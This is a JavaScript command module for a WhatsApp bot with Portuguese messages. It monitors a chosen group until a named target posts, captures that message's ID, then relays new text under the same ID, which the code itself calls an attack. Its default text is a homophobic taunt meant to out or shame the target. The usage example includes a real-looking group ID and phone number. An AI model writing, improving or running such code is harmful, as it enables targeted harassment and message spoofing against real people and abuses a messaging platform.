// commands/pv.js

const activeListeners = new Map()

module.exports = {
  name: 'pv',
  async execute({ sock, msg, args, body }) {
    const from = msg.key.remoteJid

    console.log(`[PV] Comando recebido de: ${from}`)
    console.log(`[PV] body: "${body}"`)

    let cleanBody = body.replace(/^!?pv\s+/, '').trim()
    console.log(`[PV] cleanBody: "${cleanBody}"`)

    const parts = cleanBody.split('|').map(p => p.trim())

    if (parts.length < 2) {
      await sock.sendMessage(from, {
        text: 'Use: `!pv jidDoGrupo | numeroDoAlvo | mensagem`\nEx: `!pv 120363425762875519@g.us | 5544999505767 | oi`'
      })
      return
    }

    const targetGroupJid = parts[0]

    if (!targetGroupJid.includes('@g.us')) {
      await sock.sendMessage(from, {
        text: 'JID do grupo inválido. Deve terminar com @g.us'
      })
      return
    }

    const targetNum = parts[1].replace(/\D/g, '')

    if (!targetNum || targetNum.length < 8) {
      await sock.sendMessage(from, {
        text: 'Número do alvo inválido.'
      })
      return
    }

    const mentionedJid = targetNum + '@s.whatsapp.net'

    let messageText = parts.slice(2).join('|').trim()
    if (!messageText) {
      messageText = 'sabem que você gosta de rapazes?'
    }

    console.log(`[PV] Grupo: ${targetGroupJid}`)
    console.log(`[PV] Alvo: ${mentionedJid}`)
    console.log(`[PV] Msg: ${messageText}`)

    await sock.sendMessage(from, {
      text: `Monitorando *${targetNum}* no grupo...\nQuando ele mandar msg, ataco.`
    })

    const listenerKey = `${targetGroupJid}:${mentionedJid}`

    if (activeListeners.has(listenerKey)) {
      try {
        sock.ev.off('messages.upsert', activeListeners.get(listenerKey))
      } catch (e) {}
      activeListeners.delete(listenerKey)
    }

    const listener = ({ messages, type }) => {
      if (type !== 'notify') return

      for (const incoming of messages) {
        if (!incoming?.key) continue

        const msgJid = incoming.key.remoteJid

        if (msgJid !== targetGroupJid) continue

        const realSenderJid = incoming.key.participantAlt
          || incoming.key.participant
          || incoming.key.remoteJid

        const senderClean = realSenderJid
          ?.split(':')[0]          // remove :xx
          ?.replace(/@lid$/, '@s.whatsapp.net')  // converte @lid → @s.whatsapp.net
          || ''

        const targetClean = mentionedJid
          .split(':')[0]
          .replace(/@lid$/, '@s.whatsapp.net')

        console.log(`[PV] Msg de ${realSenderJid} (clean: ${senderClean}), alvo é ${targetClean}`)

        if (senderClean !== targetClean) continue
        if (incoming.key.fromMe) continue

        const ultimaMensagemId = incoming.key.id
        console.log(`[PV] CAPTURADO ID: ${ultimaMensagemId}`)

        sock.ev.off('messages.upsert', listener)
        activeListeners.delete(listenerKey)

        executeAttack(sock, targetGroupJid, ultimaMensagemId, messageText, from)
        break
      }
    }

    sock.ev.on('messages.upsert', listener)
    activeListeners.set(listenerKey, listener)

    console.log(`[PV] Listener ativo para ${listenerKey}`)
  }
}

async function executeAttack(sock, targetJid, customId, messageText, notifyJid) {
  try {
    console.log(`[PV] Executando ataque...`)

    const messageContent = {
      extendedTextMessage: {
        text: messageText
      }
    }

    await sock.relayMessage(targetJid, messageContent, {
      messageId: customId
    })

    if (notifyJid) {
      await sock.sendMessage(notifyJid, {
        text: `*Ataque executado!*\nID capturado: \`${customId}\``
      })
    }

  } catch (err) {
    console.error('[PV] Erro no ataque:', err)
    if (notifyJid) {
      await sock.sendMessage(notifyJid, {
        text: `Erro: ${err.message}`
      })
    }
  }
}
